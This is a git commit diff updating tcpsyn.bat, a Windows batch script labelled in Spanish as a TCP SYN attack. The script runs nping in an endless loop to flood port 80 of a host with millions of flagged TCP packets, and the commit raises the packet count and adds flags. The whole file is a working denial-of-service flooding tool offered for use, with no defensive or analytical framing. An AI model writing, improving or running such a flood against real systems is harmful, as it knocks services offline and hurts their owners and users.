2ac5ad6fb99ada8607b20e3eca40a0dc33fd4c7e
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2017-05-06 18:54:23 +0200

    Update tcpsyn.bat

--- tcpsyn.bat
+++ tcpsyn.bat
@@ -2,5 +2,5 @@
 ECHO ATAQUE TCP SYN (c) hackingyseguridad 2016. Version 2.
 ECHO Requiere tener instalado en el PC, nping incluido en Zenmap https://nmap.org/download.html
 :loop
-nping --tcp-connect -rate=9 -c 900000 -ttl 255 -q 192.168.1.252
+nping --tcp-connect --flags syn,ack,psh -rate=9 -c 9999999 --ttl 255 -p 80 -q 192.168.1.252
 goto loop
